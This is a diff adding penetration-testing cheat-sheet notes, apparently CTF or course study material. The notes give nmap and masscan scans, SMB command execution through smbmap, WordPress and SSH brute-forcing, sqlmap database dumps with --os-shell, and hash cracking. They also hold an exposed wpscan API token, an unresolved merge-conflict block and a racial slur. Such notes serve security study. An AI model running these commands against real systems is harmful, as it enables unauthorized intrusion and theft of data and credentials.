@@ -95,6 +95,73 @@ NetworkIP/Mask – Search IPs on network
 --data: tamaño del cuerpo del paquete 
 --flood: técnica de Inundación de TCP
 ````
+
+#### Enumeration
+#### host enumation
+host and service enumeration
+````js
+//discover devices inside the network eth0
+netdiscover -i eth0
+nmap -sN 10.10.10.0/24
+// enumeration
+netstat -a 10.10.10.10 // netstat enumeration netbios
+snmp-check 10.10.10.10 // extract users from netbios - parrot
+enum4linux
+sudo nmap -vv -p 1-1000 -sC -A 10.10.10.10 -oN nmap_scan
+nmap -p- -sS -min-rate 10000 -Pn -n 10.10.10
+nmap -6 www.scanme.com // scan IPV6
+nmap -sC -sV -vvv -T5 -p 80,21,2222 10.10.10
+sudo nmap -v -sV -sC
+nmap -Pn -sS -n 10.10.. -T4 -oN nmap_scan // [prefer] fast scan ufo mode
+nmap -v -p- -sV -sC -T4 10.10 -oN nmap_scan // UDP/TCP scanning
+sudo nmap -p- -Pn -vvv -sS 10.10.. -oN nmap_scan
+nmap -sS -sV -A -O -Pn
+nmap -sV -sT -sU -A 10.10.. -oN nmap_scan
+sudo nmap -p- 10.10.. --open -oG nmap/AllPorts -vvv -Pn -n -sS
+sudo nmap -p22,80 -sV -sC -Pn -n 10.10.. -oN nmap/openports -vvv
+nmap -sV -p 22,443 10.10../24 // scan mi net 24
+nmap -sU -p 161 -sV -sC 10.10.. // UDP Scan
+nmap -A --min-rate=5000 --max-retries=5 10.10.. // optimize scan time
+<<<<<<< HEAD
+nmap -Pn -sS -A -oX test 10.10.10.0/24 // Scanning the network and subnet
+-PR = ARP ping scan
+-PU = UDP ping scan
+=======
+nmap -Pn -sS -A -oX test 10.10.../24 // scanning network subnet
+//scripts
+snmp //extract users of the network port 161
+-PR = ARP ping scan
+-PE = ICMP scan echo
+-PU = UDP ping scan
+-oX = save XMl
+>>>>>>> df364a4f409faf7bc6bb4b291db58d3dcabb2bb9
+-vv = verbose
+-p = ports
+-sC = default scripts
+-A = agressive scan
+-oN = save in a file
+-sS = syn scan is untrusive because don't complete the petitions
+-n = no resolution of dns
+-p- = all ports
+-sV = Probe open ports to determine service/version inf
+-T4 = Timing scanning <1-5>
+-o = output to save the scan
+-sT = TCP port scan
+-sU = UDP port scan
+-A = Agressive/ OS detection  
+--open = all ports open
+-oG = save in a grep format
+-Pn = no do ping to the ip
+-n = dont resolve domain names
+--max-retries = 1 default verify 10 times.
+-O = verifica el sistema operativo
+// My niggerian methodology
+nmap -sV -sC nmap 10.10.10.x #top1000ports
+nmap -sC -sV -v -oN nmap.txt
+masscan -e tun0 -p1-65535 -rate=1000 <ip>
+sudo nmap -sU -sV -A -T4 -v -oN udp.txt ip
+````
+
 •	OS Detection TTL
 
 ![image](https://user-images.githubusercontent.com/32601403/221194121-9a76af3a-d0e0-4e1e-b636-c596cb97830f.png)
@@ -178,9 +245,19 @@ SPF
 TXT
 •	Global Network Inventory – Tool Windows
 ````
+
+
 ////Other Enum
 ````js
 Enum4linux
+````
+
+#### enumerating -samba
+````
+search for commands
+smbmap --help | grep -i username
+smbmap -u "admin" -p "passowrd" -H 10.10.10.10 -x "ipconfig"
+-x = command
 ````
 5.	VULNERABILITY ANALYSIS
 ````js
@@ -210,3 +287,124 @@ https://github.com/PowerShellMafia/PowerSploit - Post explotacion
 TheFatRat
  Inmunity Debugger
 ````
+#### Web Enumeration & attack
+````js
+// dir enumeration
+gobuster dir -u 10.10.. -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt -q
+dir : directory listing
+-u : host
+-w : wordlists
+-t : threads int / Number of concurrent threads (default 10)
+-x : enumerate hidden files htm, php
+-q : –quiet / Don’t print the banner and other noise
+// wordpress enumeration
+wpscan --url https://localchost.com --passwords=
+wpscan -u 10.10.. -e u vp
+wpscan -u 10.10.. -e u --wordlist path/rockyou.txt //bruteforce
+-e = enumerate
+u = enumerate usernames
+vp = vulnerable plugins
+wpscan --url http://url  --api-token FRG9WoXBibili6ZqS0u7ght7USVMxbbyHf0IhiI48zo
+--username "/home/user/Desktop/users-btc.txt" --password "/home/user/Downloads/Passwords-BTC.txt"
+-e ap
+-e u
+
+// wordlist generation
+cewl -w wordlist -d 2 -m 5 http://wordpress.com
+-d = deeph of the scanning
+-m = long of the words
+-w = save to a file worlist
+````
+#### web explotation
+````js
+// sql injection
+sqlmap -u http://10.10.197.40/administrator.php --forms --dump
+-u = url
+--forms = grab the forms /detect
+--dump = retrieve data form de sqli
+#### basic sqli injection
+//SQLMap
+-u: URL
+-r: archive post
+-p variable inyectable en post
+--dbs: descubrimiento de DB
+-D nombre de la DB
+--tables encontrar tablas de la DB
+-T nombre de la tabla
+--dump extraer info del contenido de la tabla
+--random-agent --tamper=space2comment --level 2 --risk 1
+--os-shell
+
+sqlmap -u 10.10.77.169 --forms --dump
+- u = url
+- --forms= check the forms automatically
+- --dump= dump dthe database data entries
+// extract database
+sqlmap -u http://localchost.com/hey.php?artist=1 --dbs
+// extract colums
+Sqlmap -u http://localchost.com/hey.php?artist=1 --D (tabla) --T artists --columns
+// extract data of the table and the column inside of the db
+sqlmap -u http://localchost.com/hey.php?artist=1 --D (tabla) --T artist --C adesc, aname, artist_id --dump
+````
+#### bruteforcing
+````
+hydra -t4 -l lin -P /usr/share/wordlists/rockyou.txt ssh:10.10.149.11
+hydra -l lin -P /usr/share/wordlists/rockyou.txt ssh:10.10.149.118
+````
+#### stego
+````js
+exiftool cats.png
+zsteg cats.png
+binwalk -d cats.png
+// windows
+snow -C -p "magic" readme2.txt
+-p = passowrd
+//image steganography
+openstego > extract dat > 
+//stegseek to crack stego password
+````
+#### windows rpc mal configurado
+````
+rpcclient 10.10.123.10
+````
+#### hashcracking
+**hashcat**
+````terminal
+hashcat -O -w3 -m 0 56ab24c15b72a457069c5ea42fcfc640 /usr/share/wordlists/rockyou.txt --show
+-m = type of hash
+-a = attack mode (1-3) 3 bruteforcing
+--show = mostrar hash crackeado
+hashcat -O -A 0 -m 20 salt12314124:passowrdmd523432 /usr/share/worlist/rockyou.txt
+hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt --show
+````
+**john**
+````
+john --format=Raw-MD5 hash --wordlist=/usr/share/wordlists/rockyou.txt
+- --format = hash format '--list=formats | grep MD5'
+- hash = file - echo '123213dasd' >> hash
+- wordlist= = wordlist to crack
+### to show the hash cracked
+john --show --format=Raw-MD5 hash
+- --show = show the hash:Cracked
+````
+**cryptography**
+```js
+//HashCalc
+take a file and open into hashcalc
+i will give you the the hash for md5 or other algorithms
+// MD5 calculator
+it will compare both files what we need get the md5
+// HashMyFiles
+it allow you to hash all the files inside a folder
+// Veracrypt
+```
+**rainbowtables**
+```js
+Rainbowtables are already hash with password to perform cracking without calculate a new hash.
+// linux
+rtgen // rainbowcrack
+rtgen sha256 loweralpha-numeric 1 10 0 1000 4000 0 // generate a new rainbow table
+// windows
+rtgen md5 loweralpha-hnumeric 1 4 1 1000 1000 0 //
+then use app rainbowcrack // add the hashes and the rainbow table option
+```
